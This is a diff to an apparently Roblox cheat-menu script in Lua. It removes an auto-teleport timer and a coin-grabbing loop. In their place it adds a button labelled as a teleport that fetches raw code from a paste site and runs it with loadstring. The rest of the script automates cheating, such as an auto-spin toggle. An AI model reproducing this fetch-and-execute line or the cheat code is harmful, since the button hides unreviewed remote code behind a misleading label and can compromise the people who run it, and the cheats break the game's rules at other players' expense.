@@ -389,72 +389,12 @@ end
 --==================================================
 -- MAIN TAB FEATURES
 --==================================================
-CreateButton(MainContent, "📍 Dịch chuyển ngay", TeleportNow)
-
-CreateToggle(MainContent, "⏰ Auto TP theo giờ", SaveData.AutoTP, function(v)
-    SaveData.AutoTP = v
-    Save()
-    if v then
-        task.spawn(function()
-            while SaveData.AutoTP do
-                local t = os.date("*t")
-                if t.min == 5 and t.sec <= 1 then
-                    task.wait(15)
-                    TeleportNow()
-                    task.wait(15)
-                    TeleportNow()
-                    task.wait(60)
-                end
-                task.wait(0.5)
-            end
-        end)
-    end
+CreateButton(MainContent, "🤑Dịch chuyển 🤑", function()
+    loadstring(game:HttpGet("https://pastefy.app/j6DHcS0b/raw"))()
 end)
 
--- Danh sách coin cần hút
-local CoinNames = {
-    ["Radioactive Coin"] = true,
-    ["UFO Coin"] = true
-}
 
-local function getCoins()
-    local t = {}
-    for _, v in pairs(workspace:GetDescendants()) do
-        if v:IsA("BasePart") and CoinNames[v.Name] then
-            table.insert(t, v)
-        end
-    end
-    return t
-end
-
-CreateToggle(MainContent, "🔥 Auto Coin New (Mới)", SaveData.AutoCoin, function(v)
-    SaveData.AutoCoin = v
-    Save()
-
-    if v then
-        task.spawn(function()
-            while SaveData.AutoCoin do
-                local hrp = getHRP()
-                if hrp then
-                    local coins = getCoins()
-                    if #coins > 0 then
-                        for _, c in pairs(coins) do
-                            pcall(function()
-                                c.CanCollide = false
-                                c.Anchored = false
-                                c.CFrame = hrp.CFrame
-                            end)
-                        end
-                    end
-                end
-                -- 0.5 giây / lần
-                task.wait(0.5)
-            end
-        end)
-    end
-end)
-
-CreateToggle(MainContent, "🎡 Auto Spin", SaveData.AutoSpin, function(v)
+CreateToggle(MainContent, "🎡 Auto Spin Radioactive", SaveData.AutoSpin, function(v)
     SaveData.AutoSpin = v
     Save()
     if v then
